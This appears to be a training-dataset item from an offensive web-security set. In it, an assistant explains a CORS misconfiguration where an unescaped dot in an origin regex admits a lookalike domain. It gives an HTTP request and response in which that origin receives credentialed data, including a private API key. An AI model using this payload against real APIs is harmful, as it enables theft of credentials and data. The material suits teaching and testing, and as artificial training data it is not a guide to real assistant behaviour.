# CORS — web_offensive_elite_v2_sft

- source: web_offensive_elite_v2_sft
- class: cors
- cwe: CWE-942

## Scenario

Help me understand Vulnerable Implementation (Example 2) as it relates to CORS Misconfiguration, with the payloads from the field.

## Analysis / Response

**Vulnerable Implementation (Example 2)** — this technique applies to CORS Misconfiguration. Use the following only against systems you are explicitly authorized to test. Here is the approach along with the concrete payloads from the reference:

In this scenario the server utilizes a regex where the dot was not escaped correctly. For instance, something like this: `^api.example.com$` instead of `^api\.example.com$`. Thus, the dot can be replaced with any letter to gain access from a third-party domain.

```ps1
GET /endpoint HTTP/1.1
Host: api.example.com
Origin: https://apiiexample.com

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://apiiexample.com
Access-Control-Allow-Credentials: true 

{"[private API key]"}
```
